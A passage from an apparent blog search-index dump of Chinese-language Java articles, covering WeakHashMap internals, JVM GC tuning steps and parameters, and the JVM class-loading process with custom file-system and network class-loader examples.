Entry&lt;K,V&gt;[] tab = getTable(); int index = indexFor(h, tab.length); Entry&lt;K,V&gt; e = tab[index]; while (e != null) &#123; if (e.hash == h &amp;&amp; eq(k, e.get())) return e.value; e = e.next; &#125; return null;&#125;// 3. remove 方法, 分析过 expungeStaleEntries 方法，该方法就没必要看了public V remove(Object key) &#123; Object k = maskNull(key); int h = hash(k); Entry&lt;K,V&gt;[] tab = getTable(); int i = indexFor(h, tab.length); Entry&lt;K,V&gt; prev = tab[i]; Entry&lt;K,V&gt; e = prev; while (e != null) &#123; Entry&lt;K,V&gt; next = e.next; if (h == e.hash &amp;&amp; eq(k, e.get())) &#123; modCount++; size--; if (prev == e) tab[i] = next; else prev.next = next; return e.value; &#125; prev = e; e = next; &#125; return null;&#125;// 通过分析可以看到 getTable() 经常被调用到，它和 ReferenceQueue 一起完成的对 k-v 的清理工作","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://wuhaocn.github.io/tags/JVM/"}]},{"title":"JVM性能调优的6大步骤-关键调优参数详解","slug":"language/jvm/JVM性能调优的6大步骤-关键调优参数详解","date":"2021-08-04T06:25:13.664Z","updated":"2021-08-04T06:25:13.664Z","comments":true,"path":"2021/08/04/language/jvm/JVM性能调优的6大步骤-关键调优参数详解/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/jvm/JVM%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98%E7%9A%846%E5%A4%A7%E6%AD%A5%E9%AA%A4-%E5%85%B3%E9%94%AE%E8%B0%83%E4%BC%98%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"一、JVM 内存调优对 JVM 内存的系统级的调优主要的目的是减少 GC 的频率和 Full GC 的次数。 1.Full GC会对整个堆进行整理，包括 Young、Tenured 和 Perm。Full GC 因为需要对整个堆进行回收，所以比较慢，因此应该尽可能减少 Full GC 的次数。 2.导致 Full GC 的原因1)年老代（Tenured）被写满 调优时尽量让对象在新生代 GC 时被回收、让对象在新生代多存活一段时间和不要创建过大的对象及数组避免直接在旧生代创建对象 。 2)持久代 Pemanet Generation 空间不足 增大 Perm Gen 空间，避免太多静态对象 ， 控制好新生代和旧生代的比例 3)System.gc()被显示调用 垃圾回收不要手动触发，尽量依靠 JVM 自身的机制 在对 JVM 调优的过程中，很大一部分工作就是对于 FullGC 的调节，下面详细介绍对应 JVM 调优的方法和步骤。 二、JVM 性能调优方法和步骤 1.监控 GC 的状态使用各种 JVM 工具，查看当前日志，分析当前 JVM 参数设置，并且分析当前堆内存快照和 gc 日志，根据实际的各区域内存划分和 GC 执行时间，觉得是否进行优化。 举一个例子： 系统崩溃前的一些现象： 每次垃圾回收的时间越来越长，由之前的 10ms 延长到 50ms 左右，FullGC 的时间也有之前的 0.5s 延长到 4、5s FullGC 的次数越来越多，最频繁时隔不到 1 分钟就进行一次 FullGC年老代的内存越来越大并且每次 FullGC 后年老代没有内存被释放 之后系统会无法响应新的请求，逐渐到达 OutOfMemoryError 的临界值，这个时候就需要分析 JVM 内存快照 dump。 2.生成堆的 dump 文件通过 JMX 的 MBean 生成当前的 Heap 信息，大小为一个 3G（整个堆的大小）的 hprof 文件，如果没有启动 JMX 可以通过 Java 的 jmap 命令来生成该文件。 3.分析 dump 文件打开这个 3G 的堆信息文件，显然一般的 Window 系统没有这么大的内存，必须借助高配置的 Linux，几种工具打开该文件： Visual VM IBM HeapAnalyzer JDK 自带的 Hprof 工具 Mat(Eclipse 专门的静态内存分析工具)推荐使用 备注：文件太大，建议使用 Eclipse 专门的静态内存分析工具 Mat 打开分析。 4.分析结果，判断是否需要优化如果各项参数设置合理，系统没有超时日志出现，GC 频率不高，GC 耗时不高，那么没有必要进行 GC 优化，如果 GC 时间超过 1-3 秒，或者频繁 GC，则必须优化。 注：如果满足下面的指标，则一般不需要进行 GC： Minor GC 执行时间不到 50ms； Minor GC 执行不频繁，约 10 秒一次； Full GC 执行时间不到 1s； Full GC 执行频率不算频繁，不低于 10 分钟 1 次； 5.调整 GC 类型和内存分配如果内存分配过大或过小，或者采用的 GC 收集器比较慢，则应该优先调整这些参数，并且先找 1 台或几台机器进行 beta，然后比较优化过的机器和没有优化的机器的性能对比，并有针对性的做出最后选择。 6.不断的分析和调整通过不断的试验和试错，分析并找到最合适的参数，如果找到了最合适的参数，则将这些参数应用到所有服务器。 cms 参数优化步流程下面我再继续介绍下 JVM 的关键参数配置(仅用于参考)。 JVM 调优参数参考1.针对 JVM 堆的设置，一般可以通过-Xms -Xmx 限定其最小、最大值，为了防止垃圾收集器在最小、最大之间收缩堆而产生额外的时间，通常把最大、最小设置为相同的值;2.年轻代和年老代将根据默认的比例（1：2）分配堆内存， 可以通过调整二者之间的比率 NewRadio 来调整二者之间的大小，也可以针对回收代。比如年轻代，通过 -XX:newSize -XX:MaxNewSize 来设置其绝对大小。同样，为了防止年轻代的堆收缩，我们通常会把-XX:newSize -XX:MaxNewSize 设置为同样大小。 3.年轻代和年老代设置多大才算合理1）更大的年轻代必然导致更小的年老代，大的年轻代会延长普通 GC 的周期，但会增加每次 GC 的时间；小的年老代会导致更频繁的 Full GC2）更小的年轻代必然导致更大年老代，小的年轻代会导致普通 GC 很频繁，但每次的 GC 时间会更短；大的年老代会减少 Full GC 的频率 如何选择应该依赖应用程序对象生命周期的分布情况：如果应用存在大量的临时对象，应该选择更大的年轻代；如果存在相对较多的持久对象，年老代应该适当增大。 但很多应用都没有这样明显的特性。 在抉择时应该根 据以下两点： （1）本着 Full GC 尽量少的原则，让年老代尽量缓存常用对象，JVM 的默认比例 1：2 也是这个道理 。 （2）通过观察应用一段时间，看其他在峰值时年老代会占多少内存，在不影响 Full GC 的前提下，根据实际情况加大年轻代，比如可以把比例控制在 1：1。 但应该给年老代至少预留 1/3 的增长空间。 4.在配置较好的机器上（比如多核、大内存），可以为年老代选择并行收集算法： -XX:+UseParallelOldGC 。5.线程堆栈的设置：每个线程默认会开启 1M 的堆栈，用于存放栈帧、调用参数、局部变量等，对大多数应用而言这个默认值太了，一般 256K 就足用。理论上，在内存不变的情况下，减少每个线程的堆栈，可以产生更多的线程，但这实际上还受限于操作系统。 觉得不错请点赞支持下。 —-end—- JVM 相关技术干货推荐： 深入详解 JVM 内存模型与 JVM 参数详细配置 7 种 JVM 垃圾收集器特点，优劣势、及使用场景 JVM 的 4 种垃圾回收算法、垃圾回收机制与总结 深入剖析 JVM：G1 收集器+回收流程+推荐用例 参考：https://zhuanlan.zhihu.com/p/58897189","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://wuhaocn.github.io/tags/JVM/"}]},{"title":"JVM类加载机制","slug":"language/jvm/JVM类加载机制","date":"2021-08-04T06:25:13.664Z","updated":"2021-08-04T06:25:13.665Z","comments":true,"path":"2021/08/04/language/jvm/JVM类加载机制/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/jvm/JVM%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/","excerpt":"","text":"类加载机制1. 类的加载过程类从被加载到虚拟机内存中开始，到卸载出内存为止，它的整个生命周期包括：加载（Loading）、验证（Verification）、准备(Preparation)、解析(Resolution)、初始化(Initialization)、使用(Using)和卸载(Unloading)7 个阶段。其中准备、验证、解析 3 个部分统称为连接（Linking）。如图所示: 1234567graph LR加载--&gt;验证验证--&gt;准备准备--&gt;解析解析--&gt;初始化初始化--&gt;使用使用--&gt;卸载 加载、验证、准备、初始化和卸载这 5 个阶段的顺序是确定的，类的加载过程必须按照这种顺序按部就班地开始，而解析阶段则不一定：它在某些情况下可以在初始化阶段之后再开始，这是为了支持 Java 语言的运行时绑定（也称为动态绑定或晚期绑定）。以下陈述的内容都已 HotSpot 为基准。 1.1 加载虚拟机在加载阶段需要完成三件事: 通过一个类的全限定名来获取定义此类的二进制字节流，如 Class 文件,网络,动态生成,数据库等 将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构 在内存中生成一个代表这个类的 java.lang.Class 对象，作为方法区这个类的各种数据的访问入口加载阶段和连接阶段（Linking）的部分内容（如一部分字节码文件格式验证动作）是交叉进行的，加载阶段尚未完成，连接阶段可能已经开始，但这些夹在加载阶段之中进行的动作，仍然属于连接阶段的内容，这两个阶段的开始时间仍然保持着固定的先后顺序。 1.2 验证验证是连接阶段的第一步，这一阶段的目的是为了确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全，验证阶段大致会完成 4 个阶段的检验动作： 文件格式验证：验证字节流是否符合 Class 文件格式的规范；例如：是否以魔术 0xCAFEBABE 开头、主次版本号是否在当前虚拟机的处理范围之内、常量池中的常量是否有不被支持的类型。 元数据验证：对字节码描述的信息进行语义分析（注意：对比 javac 编译阶段的语义分析），以保证其描述的信息符合 Java 语言规范的要求；例如：这个类是否有父类，除了 java.lang.Object 之外。 字节码验证：通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。 符号引用验证：确保解析动作能正确执行。验证阶段可能抛出一个 java.lang.IncompatibleClassChangeError 异常的子类，如 java.lang.IllegalAccessError、 java. lang. NoSuchFieldError、验证阶段是非常重要的，但不是必须的，它对程序运行期没有影响，如果所引用的类经过反复验证，那么可以考虑采用-Xverifynone 参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间。 1.3 准备准备阶段是正式为类变量分配内存并设置类变量初始值的阶段，这些变量所使用的内存都将在方法区中进行分配。这时候进行内存分配的仅包括类变量（被 static 修饰的变量），而不包括实例变量，实例变量将会在对象实例化时随着对象一起分配在堆中。其次，这里所说的初始值“通常情况”下是数据类型的零值. 如下定义:public static int value=123; 那变量 value 在准备阶段过后的初始值为 0 而不是 123.因为这时候尚未开始执行任何 java 方法，而把 value 赋值为 123 的 putstatic 指令是程序被编译后，存放于类构造器()方法之中，所以把 value 赋值为 123 的动作将在初始化阶段才会执行。 如下定义：public static final int value=123; 即当类字段的字段属性是 ConstantValue 时，会在准备阶段初始化为指定的值，所以标注为 final 之后，value 的值在准备阶段初始化为 123 而非 0. 1.4 解析解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程。解析针对如下 7 类符号引用进行： 类或接口字段类方法接口方法方法类型方法句柄调用点限定符 1.5 初始化类初始化阶段是类加载过程的最后一步，才真正开始执行类中定义的 Java 程序代码（或者说是字节码）。前面的类加载过程中，除了在加载阶段用户应用程序可以通过自定义类加载器参与之外，其余动作完全由虚拟机主导和控制。 在准备阶段，变量已经赋过一次系统要求的初始值，而在初始化阶段，则是根据程序员通过程序制定的主观计划去初始化类变量和其他资源，或者可以从另外一个角度来表达：初始化阶段是执行类构造器()方法的过程。我们放到后面再讲()方法是怎么生成的，在这里，我们先看一下()方法执行过程中可能会影响程序运行行为的一些特点和细节，这部分相对更贴近于普通的程序开发人员[7]：·()方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块（static{}块）中的语句合并产生的，编译器收集的顺序是由语句在源文件中出现的顺序所决定的，静态语句块中只能访问到定义在静态语句块之前的变量，定义在它之后的变量，在前面的静态语句块中可以赋值，但是不能访问。·()方法与类的构造函数（或者说实例构造器()方法）不同，它不需要显式地调用父类构造器，虚拟机会保证在子类的()方法执行之前，父类的()方法已经执行完毕。因此在虚拟机中第一个被执行的()方法的类肯定是 java.lang.Object。·由于父类的()方法先执行，也就意味着父类中定义的静态语句块要优先于子类的变量赋值操作，如下代码执行字段 B 的值将会是 2 而不是 1。()方法执行顺序： 12345678910111213141516171819202122232425262728293031323334353637383940414243package sf.jvm.load; class Parent &#123; public static int A = 1; static &#123; A = 2; &#125; public int getA()&#123; return A; &#125;&#125;class Sub extends Parent &#123; public static int B = A; public int getB()&#123; return B; &#125; public static void main(String[] args) &#123; new Parent(); System.out.println(Sub.B); System.out.println(new Sub().getB()); &#125;&#125;/** Compiled from &quot;Parent.java&quot; class sf.jvm.load.Parent &#123; public static int A; sf.jvm.load.Parent(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public int getA(); Code: 0: getstatic #2 // Field A:I 3: ireturn static &#123;&#125;; Code: 0: iconst_1 1: putstatic #2 // Field A:I 4: iconst_2 5: putstatic #2 // Field A:I 8: return &#125; */ ·()方法对于类或接口来说并不是必须的，如果一个类中没有静态语句块，也没有对变量的赋值操作，那么编译器可以不为这个类生成()方法。·接口中不能使用静态语句块，但仍然有变量初始化的赋值操作，因此接口与类一样都会生成()方法。但接口与类不同的是，执行接口的()方法不需要先执行父接口的()方法。只有当父接口中定义的变量被使用时，父接口才会被初始化。另外，接口的实现类在初始化时也一样不会执行接口的()方法。·虚拟机会保证一个类的()方法在多线程环境中被正确地加锁和同步，如果多个线程同时去初始化一个类，那么只会有一个线程去执行这个类的()方法，其他线程都需要阻塞等待，直到活动线程执行()方法完毕。如果在一个类的()方法中有耗时很长的操作，那就可能造成多个进程阻塞，在实际应用中这种阻塞往往是很隐蔽的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package sf.jvm.load;class DeadLoopClass &#123; static &#123; //如果不加上这个if语句，编译器将提示&quot;Initializerdoesnotcompletenormally&quot;并拒绝编译 if (true) &#123; System.out.println(Thread.currentThread() + &quot;initDeadLoopClass&quot;); while (true) &#123; &#125; &#125; &#125; public static void main(String[] args) &#123; Runnable script = new Runnable() &#123; public void run() &#123; System.out.println(Thread.currentThread() + &quot;start&quot;); DeadLoopClass dlc = new DeadLoopClass(); System.out.println(Thread.currentThread() + &quot;runover&quot;); &#125; &#125;; Thread thread1 = new Thread(script); Thread thread2 = new Thread(script); thread1.start(); thread2.start(); &#125;&#125;/** * &quot;C:\\Program Files\\Java\\jdk1.8.0_91\\bin\\javap.exe&quot; -c sf.jvm.load.DeadLoopClass Compiled from &quot;DeadLoopClass.java&quot; class sf.jvm.load.DeadLoopClass &#123; sf.jvm.load.DeadLoopClass(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public static void main(java.lang.String[]); Code: 0: new #2 // class sf/jvm/load/DeadLoopClass$1 3: dup 4: invokespecial #3 // Method sf/jvm/load/DeadLoopClass$1.&quot;&lt;init&gt;&quot;:()V 7: astore_1 8: new #4 // class java/lang/Thread 11: dup 12: aload_1 13: invokespecial #5 // Method java/lang/Thread.&quot;&lt;init&gt;&quot;:(Ljava/lang/Runnable;)V 16: astore_2 17: new #4 // class java/lang/Thread 20: dup 21: aload_1 22: invokespecial #5 // Method java/lang/Thread.&quot;&lt;init&gt;&quot;:(Ljava/lang/Runnable;)V 25: astore_3 26: aload_2 27: invokevirtual #6 // Method java/lang/Thread.start:()V 30: aload_3 31: invokevirtual #6 // Method java/lang/Thread.start:()V 34: return static &#123;&#125;; Code: 0: getstatic #7 // Field java/lang/System.out:Ljava/io/PrintStream; 3: new #8 // class java/lang/StringBuilder 6: dup 7: invokespecial #9 // Method java/lang/StringBuilder.&quot;&lt;init&gt;&quot;:()V 10: invokestatic #10 // Method java/lang/Thread.currentThread:()Ljava/lang/Thread; 13: invokevirtual #11 // Method java/lang/StringBuilder.append:(Ljava/lang/Object;)Ljava/lang/StringBuilder; 16: ldc #12 // String initDeadLoopClass 18: invokevirtual #13 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 21: invokevirtual #14 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 24: invokevirtual #15 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 27: goto 27 &#125; * */ 运行结果如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546Thread[main,5,main]initDeadLoopClass通过分析：一条线程正在死循环以模拟长时间操作，另外一条线程在阻塞等待.线程堆栈如下:2017-07-29 20:05:00Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.91-b14 mixed mode):&quot;Monitor Ctrl-Break&quot; #10 daemon prio=5 os_prio=0 tid=0x0000000018554800 nid=0x4920 runnable [0x00000000190de000] java.lang.Thread.State: RUNNABLE at java.net.DualStackPlainSocketImpl.accept0(Native Method) at java.net.DualStackPlainSocketImpl.socketAccept(DualStackPlainSocketImpl.java:131) at java.net.AbstractPlainSocketImpl.accept(AbstractPlainSocketImpl.java:409) at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:199) - locked &lt;0x00000000d79d67c0&gt; (a java.net.SocksSocketImpl) at java.net.ServerSocket.implAccept(ServerSocket.java:545) at java.net.ServerSocket.accept(ServerSocket.java:513) at com.intellij.rt.execution.application.AppMain$1.run(AppMain.java:79) at java.lang.Thread.run(Thread.java:745)&quot;Finalizer&quot; #3 daemon prio=8 os_prio=1 tid=0x00000000027d8800 nid=0x2d14 in Object.wait() [0x000000001837e000] java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) - waiting on &lt;0x00000000d7808ee0&gt; (a java.lang.ref.ReferenceQueue$Lock) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143) - locked &lt;0x00000000d7808ee0&gt; (a java.lang.ref.ReferenceQueue$Lock) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:164) at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:209)&quot;Reference Handler&quot; #2 daemon prio=10 os_prio=2 tid=0x00000000027d3000 nid=0x4914 in Object.wait() [0x000000001827f000] java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) - waiting on &lt;0x00000000d7806b50&gt; (a java.lang.ref.Reference$Lock) at java.lang.Object.wait(Object.java:502) at java.lang.ref.Reference.tryHandlePending(Reference.java:191) - locked &lt;0x00000000d7806b50&gt; (a java.lang.ref.Reference$Lock) at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)&quot;main&quot; #1 prio=5 os_prio=0 tid=0x000000000220e000 nid=0x450c runnable [0x00000000026de000] java.lang.Thread.State: RUNNABLE at sf.jvm.load.DeadLoopClass.&lt;clinit&gt;(DeadLoopClass.java:8) at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Class.java:264) at com.intellij.rt.execution.application.AppMain.main(AppMain.java:123)&quot;VM Thread&quot; os_prio=2 tid=0x0000000016ff7000 nid=0x6d4 runnable&quot;GC task thread#0 (ParallelGC)&quot; os_prio=0 tid=0x00000000026f7800 nid=0x4890 runnable&quot;GC task thread#1 (ParallelGC)&quot; os_prio=0 tid=0x00000000026f9000 nid=0x4514 runnable&quot;VM Periodic Task Thread&quot; os_prio=2 tid=0x00000000184e1800 nid=0x4934 waiting on conditionJNI global references: 15 2 类加载器2.1 类加载器概述虚拟机设计团队把类加载阶段中的“通过一个类的全限定名来获取描述此类的二进制字节流”这个动作放到 Java 虚拟机外部去实现，以便让应用程序自己决定如何去获取所需要的类。实现这个动作的代码模块被称为“类加载器”。类加载器可以说是 Java 语言的一项创新，也是 Java 语言流行的重要原因之一，它最初是为了满足 JavaApplet 的需求而被开发出来的。如今 JavaApplet 技术基本上已经死掉[1]，但类加载器却在类层次划分、OSGi、热部署、代码加密等领域大放异彩，成为了 Java 技术体系中一块重要的基石。类加载器（class loader）用来加载 Java 类到 Java 虚拟机中。一般来说，Java 虚拟机使用 Java 类的方式如下：Java 源程序（.java 文件）在经过 Java 编译器编译之后就被转换成 Java 字节代码（.class 文件）。类加载器负责读取 Java 字节代码，并转换成 java.lang.Class 类的一个实例。每个这样的实例用来表示一个 Java 类。通过此实例的 newInstance()方法就可以创建出该类的一个对象。实际的情况可能更加复杂，比如 Java 字节代码可能是通过工具动态生成的，也可能是通过网络下载的。 2.2 类加载器的结构12345graph BT启动类加载器--&gt;扩展类加载器扩展类加载器--&gt;应用类加载器应用类加载器--&gt;自定义加载器1应用类加载器--&gt;自定义加载器2 Java 虚拟机的角度讲，只存在两种不同的类加载器：一种是启动类加载器（BootstrapClassLoader），这个类加载器使用 C++语言实现[2]，是虚拟机自身的一部分；另外一种就是所有其他的类加载器，这些类加载器都由 Java 语言实现，独立于虚拟机外部，并且全都继承自抽象类 java.lang.ClassLoader。从 Java 开发人员的角度来看，类加载器就还可以划分得更细致一些，绝大部分 Java 程序都会使用到以下三种系统提供的类加载器：：引导类加载器（bootstrap class loader）：它用来加载 Java 的核心库，是用原生代码来实现的，并不继承自 java.lang.ClassLoader。扩展类加载器（extensions class loader）：它用来加载 Java 的扩展库。Java 虚拟机的实现会提供一个扩展库目录。该类加载器在此目录里面查找并加载 Java 类。应用程序类加载器（application class loader）：它根据 Java 应用的类路径（CLASSPATH）来加载 Java 类。一般来说，Java 应用的类都是由它来完成加载的。可以通过 ClassLoader.getSystemClassLoader()来获取它。除了系统提供的类加载器以外，开发人员可以通过继承 java.lang.ClassLoader 类的方式实现自己的类加载器，以满足一些特殊的需求。 双亲委派模型的工作过程是：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器都是如此，因此所有的加载请求最终都应该传送到顶层的启动类加载器中，只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去加载。 破坏双亲委派模型双亲委派模型的第一次“被破坏”其实发生在双亲委派模型出现之前——即 JDK1.2 发布之前。由于双亲委派模型在 JDK1.2 之后才被引入的，而类加载器和抽象类 java.lang.ClassLoader 则在 JDK1.0 时代就已经存在，面对已经存在的用户自定义类加载器的实现代码，Java 设计者们引入双亲委派模型时不得不做出一些妥协。为了向前兼容，JDK1.2 之后的 java.lang.ClassLoader 添加了一个新的 protected 方法 findClass()，双亲委派模型的第二次“被破坏”是由这个模型自身的缺陷所导致的，双亲委派很好地解决了各个类加载器的基础类的统一问题（越基础的类由越上层的加载器进行加载），基础类之所以被称为“基础”，是因为它们总是作为被用户代码调用的 API，但世事往往没有绝对的完美，如果基础类又要调用回用户的代码，那该怎么办了？这并非是不可能的事情，一个典型的例子便是 JNDI 服务，JNDI 现在已经是 Java 的标准服务，它的代码由启动类加载器去加载（在 JDK1.3 时代放进去的 rt.jar），但 JNDI 的目的就是对资源进行集中管理和查找，它需要调用由独立厂商实现并部署在应用程序的 ClassPath 下的 JNDI 接口提供者（SPI，ServiceProviderInterface）的代码，但启动类加载器不可能“认识”这些代码啊！那该怎么办？为了解决这个困境，Java 设计团队只好引入了一个不太优雅的设计：线程上下文类加载器（ThreadContextClassLoader）。这个类加载器可以通过 java.lang.Thread 类的 setContextClassLoaser()方法进行设置，如果创建线程时还未设置，它将会从父线程中继承一个；如果在应用程序的全局范围内都没有设置过，那么这个类加载器默认就是应用程序类加载器。有了线程上下文类加载器，就可以做一些“舞弊”的事情了，JNDI 服务使用这个线程上下文类加载器去加载所需要的 SPI 代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上就是打通了双亲委派模型的层次结构来逆向使用类加载器，已经违背了双亲委派模型的一般性原则，但这也是无可奈何的事情。Java 中所有涉及 SPI 的加载动作基本上都采用这种方式，例如 JNDI、JDBC、JCE、JAXB 和 JBI 等。双亲委派模型的第三次“被破坏”是由于用户对程序动态性的追求而导致的，这里所说的“动态性”指的是当前一些非常“热”门的名词：代码热替换（HotSwap）、模块热部署（HotDeployment）等，说白了就是希望应用程序能像我们的电脑外设那样，插上鼠标或 U 盘，不用重启机器就能立即使用，鼠标有问题或要升级就换个鼠标，不用停机也不用重启。对于个人电脑来说，重启一次其实没有什么大不了的，但对于一些生产系统来说，关机重启一次可能就要被列为生产事故，这种情况下热部署就对软件开发者，尤其是企业级软件开发者具有很大的吸引力。在 JSR-297[4]、JSR-277[5]规范从纸上标准变成真正可运行的程序之前，OSGi 是当前业界“事实上”的 Java 模块化标准，而 OSGi 实现模块化热部署的关键则是它自定义的类加载器机制的实现。每一个程序模块（OSGi 中称为 Bundle）都有一个自己的类加载器，当需要更换一个 Bundle 时，就把 Bundle 连同类加载器一起换掉以实现代码的热替换。在 OSGi 环境下，类加载器不再是双亲委派模型中的树状结构，而是进一步发展为网状结构，当收到类加载请求时，OSGi 将按照下面的顺序进行类搜索： （1）将以 java.*开头的类，委派给父类加载器加载。（2）否则，将委派列表名单内的类，委派给父类加载器加载。（3）否则，将 Import 列表中的类，委派给 Export 这个类的 Bundle 的类加载器加载。（4）否则，查找当前 Bundle 的 ClassPath，使用自己的类加载器加载。（5）否则，查找类是否在自己的 FragmentBundle 中，如果在，则委派给 FragmentBundle 的类加载器加载。（6）否则，查找 DynamicImport 列表的 Bundle，委派给对应 Bundle 的类加载器加载。（7）否则，类查找失败。上面的查找顺序中只有开头两点仍然符合双亲委派规则，其余的类查找都是在平级的类加载器中进行的。 虽然使用了“被破坏”这个词来形容上述不符合双亲委派模型原则的行为，但这里“被破坏”并不带有贬义的感情色彩。只要有足够意义和理由，突破已有的原则就可算作一种创新。正如 OSGi 中的类加载器并不符合传统的双亲委派的类加载器，并且业界对其为了实现热部署而带来的额外的高复杂度还存在不少争议，但在 Java 程序员中基本有一个共识：OSGi 中对类加载器的使用是很值得学习的，弄懂了 OSGi 的实现，自然就明白了类加载器的精粹。//TODOOSGI 2.3 自定义类加载器实例:2.3.1 文件加载:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package sf.jvm.load.classloader;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.Method;public class FileSystemClassLoader extends ClassLoader &#123; private String rootDir; public FileSystemClassLoader(String rootDir) &#123; this.rootDir = rootDir; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; byte[] classData = getClassData(name); if (classData == null) &#123; throw new ClassNotFoundException(); &#125; else &#123; return defineClass(name, classData, 0, classData.length); &#125; &#125; private byte[] getClassData(String className) &#123; String path = classNameToPath(className); try &#123; InputStream ins = new FileInputStream(path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 4096; byte[] buffer = new byte[bufferSize]; int bytesNumRead = 0; while ((bytesNumRead = ins.read(buffer)) != -1) &#123; baos.write(buffer, 0, bytesNumRead); &#125; return baos.toByteArray(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return null; &#125; private String classNameToPath(String className) &#123; return rootDir + File.separatorChar + className.replace(&#x27;.&#x27;, File.separatorChar) + &quot;.class&quot;; &#125; public static void main(String[] args) &#123; String classDataRootPath = &quot;D:\\\\Code\\\\Jcode\\\\notes\\\\java-jlp\\\\java-jvm\\\\target\\\\classes&quot;; FileSystemClassLoader fileSystemClassLoader1 = new FileSystemClassLoader(classDataRootPath); FileSystemClassLoader fileSystemClassLoader2 = new FileSystemClassLoader(classDataRootPath); String className = &quot;sf.jvm.load.simple.Sample&quot;; try &#123; Class&lt;?&gt; class1 = fileSystemClassLoader1.loadClass(className); Object obj1 = class1.newInstance(); Class&lt;?&gt; class2 = fileSystemClassLoader1.loadClass(className); Object obj2 = class2.newInstance(); Method setSampleMethod = class1.getMethod(&quot;setSample&quot;, Object.class); setSampleMethod.invoke(obj1, obj2); Method setSampleMethod2 = class1.getMethod(&quot;compare&quot;, Object.class); setSampleMethod2.invoke(obj1, obj2); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 2.3.2 网络加载:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package sf.jvm.load.classloader;import sf.jvm.load.api.ICalculator;import java.io.ByteArrayOutputStream;import java.io.InputStream;import java.net.URL;public class NetworkClassLoader extends ClassLoader &#123; private String rootUrl; public NetworkClassLoader(String rootUrl) &#123; this.rootUrl = rootUrl; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; byte[] classData = getClassData(name); if (classData == null) &#123; throw new ClassNotFoundException(); &#125; else &#123; return defineClass(name, classData, 0, classData.length); &#125; &#125; private byte[] getClassData(String className) &#123; String path = classNameToPath(className); try &#123; URL url = new URL(path); InputStream ins = url.openStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 4096; byte[] buffer = new byte[bufferSize]; int bytesNumRead = 0; while ((bytesNumRead = ins.read(buffer)) != -1) &#123; baos.write(buffer, 0, bytesNumRead); &#125; return baos.toByteArray(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; private String classNameToPath(String className) &#123; return rootUrl + &quot;/&quot; + className.replace(&#x27;.&#x27;, &#x27;/&#x27;) + &quot;.class&quot;; &#125; public static void main(String[] args) &#123; String url = &quot;http://localhost:8080/ClassloaderTest/classes&quot;; NetworkClassLoader ncl = new NetworkClassLoader(url); String basicClassName = &quot;sf.jvm.load.simple.CalculatorBasic&quot;; String advancedClassName = &quot;sf.jvm.load.simple.CalculatorAdvanced&quot;; try &#123; Class&lt;?&gt; clazz = ncl.loadClass(basicClassName); ICalculator calculator = (ICalculator) clazz.newInstance(); System.out.println(calculator.getVersion()); clazz = ncl.loadClass(advancedClassName); calculator = (ICalculator) clazz.newInstance(); System.out.println(calculator.getVersion()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; 